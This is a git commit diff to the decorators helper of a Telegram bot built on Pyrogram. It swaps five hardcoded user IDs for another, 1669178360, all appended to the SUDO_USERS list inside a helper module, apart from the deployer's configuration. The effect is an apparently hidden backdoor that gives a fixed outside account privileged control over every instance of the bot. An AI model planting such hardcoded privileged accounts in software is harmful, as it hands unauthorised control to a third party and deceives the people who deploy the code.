f9cd6c8f813c199cffe35623bc5180b7fbdccd21
Zaid <83804937+Itsunknown-12@users.noreply.github.com>
2021-09-12 14:30:11 +0530

    Update decorators.py

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -3,14 +3,10 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 
+from config import Veez
 from helpers.admins import get_administrators
-from config import SUDO_USERS
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
-SUDO_USERS.append(1448474573)
-SUDO_USERS.append(1672609421)
-SUDO_USERS.append(1670523611)
+Veez.SUDO_USERS.append(1669178360)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
@@ -24,7 +20,7 @@ def errors(func: Callable) -> Callable:
 
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
+        if message.from_user.id in Veez.SUDO_USERS:
             return await func(client, message)
 
         administrators = await get_administrators(message.chat)
@@ -38,10 +34,11 @@ def authorized_users_only(func: Callable) -> Callable:
 
 def sudo_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
+        if message.from_user.id in Veez.SUDO_USERS:
             return await func(client, message)
 
     return decorator
+
 
 # Utils Helper
 def humanbytes(size):
